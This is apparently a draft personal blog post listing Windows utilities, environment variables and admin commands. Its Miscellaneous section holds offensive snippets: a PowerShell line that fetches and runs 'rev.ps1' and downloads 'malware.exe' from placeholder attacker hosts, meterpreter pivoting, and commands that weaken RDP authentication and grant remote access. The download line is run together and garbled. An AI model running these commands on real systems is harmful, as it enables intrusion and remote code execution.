---
layout: post
draft: true
title: "Windows (winnt) gems"
slug: "winnt"
date: "2022-05-11 21:02:04+11:00"
lastmod: "2022-05-11 21:02:04+11:00"
comments: false
categories:
  - winnt
tags:
  - winnt
  - windows
  - handy
---

- [Purpose](#purpose)
- [File system locations](#file-system-locations)
- [Base utility programs](#base-utility-programs)
  - [GUI](#gui)
  - [CLI](#cli)
- [Environment variables](#environment-variables)
- [System information](#system-information)
- [Networking](#networking)
- [Domain](#domain)
- [Remote](#remote)
- [Miscellaneous](#miscellaneous)
  - [ACLs](#acls)
  - [Base64 decode](#base64-decode)
  - [Download file](#download-file)
  - [Firewall re-ruling](#firewall-re-ruling)
  - [Port forwarding](#port-forwarding)
  - [RDP enabling](#rdp-enabling)
- [Third party tools](#third-party-tools)
  - [sysinternals](#sysinternals)

## Purpose

Modern Windows as we know it is a decendent of the original NT (new technology) code base started by the legendary [Dave Cutler](https://en.wikipedia.org/wiki/Dave_Cutler) and his team in 1988. Dave was known to have a distain for UNIX and took a different approach to building his new OS. Windows is jam packed with weird and wonderful programs, shortcuts, boot modes, hacks; I wanted to start documenting (a non-comprehensive) list of the ones I find useful.

## File system locations

TODO

## Base utility programs

Most of these have shipped since the original builds of NT. This list excludes non-standard or non-default programs.

### GUI

- `appwiz.cpl`: installed programs
- `charmap`: character picker
- `compmgmt.msc` computer local management
- `control.exe system` windows about (build info)
- `cmd.exe` baked in terminal emulator
- `devmgmt.msc` device and driver management
- `diskmgmt.msc` storage volume management
- `eventvwr` event logs
- `gpedit.msc` group policy
- `inetcpl.cpl` deep rooted net options such as proxy, VPN
- `lusrmgr.msc` local users and groups
- `msconfig`: deep windows configurations
- `msinfo32` system info
- `notepad.exe` text editor
- `optionalfeatures` windows features
- `perfmon`: performance counters
- `regedt32.exe` registry (global config store) editor
- `msra.exe` remote assistance
- `resmon.exe` resource usage
- `rstrui.exe` system restore
- `secpol.msc` local OS security policies
- `services.msc` daemon processes
- `sigverif`: validate driver and file signatures
- `taskmgr.exe` process manager
- `taskschd.msc` cron for windows
- `UserAccountControlSettings.exe` UAC settings
- `WF.msc` firewall
- `winver` windows build info

### CLI

- `findstr.exe` grep for windows
- `ipconfig.exe` TCP/IP interface configuration



## Environment variables

The base NT set:

- `ALLUSERSPROFILE`: `C:\ProgramData`
- `APPDATA`: `C:\Users\ben\AppData\Roaming`
- `CommonProgramFiles`: `C:\Program Files\Common Files`
- `CommonProgramFiles(x86)` : `C:\Program Files (x86)\Common Files`
- `CommonProgramW6432`: `C:\Program Files\Common Files`
- `COMPUTERNAME`: `RYZEN-WIN11`
- `ComSpec`: `C:\Windows\system32\cmd.exe`
- `DriverData`: `C:\Windows\System32\Drivers\DriverData`
- `HOMEDRIVE`: `C:`
- `HOMEPATH`: `\Users\ben`
- `LOCALAPPDATA`: `C:\Users\ben\AppData\Local`
- `LOGONSERVER`: `\\RYZEN-WIN11`
- `NUMBER_OF_PROCESSORS`: `12`
- `OS`: `Windows_NT`
- `Path`: `C:\Program Files\PowerShell\7;C:\Program Files (x86)\Microsoft SDKs\Azure\CLI2\wbin;C:\â€¦`
- `PATHEXT`: `.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL`
- `PROCESSOR_ARCHITECTURE`: `AMD64`
- `PROCESSOR_IDENTIFIER`: `AMD64 Family 25 Model 33 Stepping 0, AuthenticAMD`
- `PROCESSOR_LEVEL`: `25`
- `PROCESSOR_REVISION`: `2100`
- `ProgramData`: `C:\ProgramData`
- `ProgramFiles`: `C:\Program Files`
- `ProgramFiles(x86)` : `C:\Program Files (x86)`
- `ProgramW6432`: `C:\Program Files`
- `PUBLIC`: `C:\Users\Public`
- `SystemDrive`: `C:`
- `SystemRoot`: `C:\Windows`
- `TEMP`: `C:\Users\ben\AppData\Local\Temp`
- `TMP`: `C:\Users\ben\AppData\Local\Temp`
- `USERDOMAIN`: `RYZEN-WIN11`
- `USERDOMAIN_ROAMINGPROFILE`: `RYZEN-WIN11`
- `USERNAME`: `ben`
- `USERPROFILE`: `C:\Users\ben`
- `windir`: `C:\Windows`




## System information

- `sc query state=all` running daemons
- `tasklist /svc` show running processes and daemons
- `tasklist /m` show processes and DLLs
- `tasklist /S <ip> /v` remote process listing

## Networking

## Domain

## Remote

## Miscellaneous

### ACLs

```
icacls text.txt /grant Everyone:F
```

### Base64 decode

```
certutil -decode foo.b64 foo.exe
```

### Download file

```
IEX (New-Object System.Net.WebClient).DownloadString("http://ATTACKER_IP/rev.ps1")(New-Object System.Net.WebClient).DownloadFile("http://ATTACKER_SERVER/malware.exe", "C:\Windows\Temp\malware.exe")  Invoke-WebRequest "http://ATTACKER_SERVER/malware.exe" -OutFile "C:\Windows\Temp\malware.exe"
```

### Firewall re-ruling

```
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow
```

### Port forwarding

```
 # using plink
 plink.exe -l user -pw pass123 192.168.1.56 -R 8080:127.0.0.1:8080

 # using meterpreterportfwd
 add -l attacker-port -p victim-port -r victim-ip
 portfwd add -l 3306 -p 3306 -r 192.168.1.56

 # Dynamic Pivoting using ssh with proxy chain
 ssh -D 9050 root@target

 # using ssh
 ssh -L localhost:8080:target:8080 root@targetip
```

### RDP enabling

```
# CMD
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
# Powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Optional
net localgroup "Remote Desktop Users" morph3 /add

# Re-ruling firewall
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow
```


## Third party tools

- [Fiddler](http://www.fiddlertool.com/) HTTP/HTTPS protocol debugging proxy
- [PureText](http://stevemiller.net/puretext/) removes rich formatting from text
- [ScreenToGif](https://www.screentogif.com/)
- [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) Mark Russinovich's low-level utility collection
- [ZoomIt](https://docs.microsoft.com/en-us/sysinternals/downloads/zoomit) on screen drawing and zooming
- [Windows PowerToys](https://docs.microsoft.com/en-us/windows/powertoys/) color picker, fancy zones, file explorer addons, image resizers, keyboard manager and remapper, an Apple Spotlight-like launcher, Shortcut Guide
- [Winget](https://docs.microsoft.com/en-us/windows/package-manager/winget/) apt for windows
- [WinDirStat](https://windirstat.net/)
- [WinDbg](https://www.microsoft.com/en-us/p/windbg-preview/9pgjgd53tn86) low level goodness

### sysinternals


